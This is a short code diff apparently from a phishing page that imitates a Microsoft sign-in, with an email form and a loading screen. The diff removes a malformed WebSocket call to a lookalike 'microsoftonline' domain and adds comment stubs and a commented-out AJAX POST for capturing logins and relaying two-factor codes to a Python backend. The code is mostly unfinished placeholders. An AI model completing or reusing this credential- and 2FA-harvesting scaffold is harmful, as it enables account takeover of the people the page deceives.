@@ -8,8 +8,25 @@ var emailDiv = document.querySelector(".email-sign-in-form");
 var loadingDiv = document.querySelector(".loading-screen");
 
 
-var socket = new WebSocket('wss://https://microsoftonlinecsulb.com','109');
-socket.send("hello");
+//create sign in function
+
+
+//write function that will check if login status file exists and will allow the login to continue to 2fa
+
+// function name() {
+//   $.ajax({
+//       type: "POST",
+//       url: "/new.py",
+//       data: { param:},
+//       success: callbackFunc
+//   });
+// }
+
+
+//create 2fa function to call write 2fa function in python
+
+
+
 
 //testing stuff
 function makeid(length) {
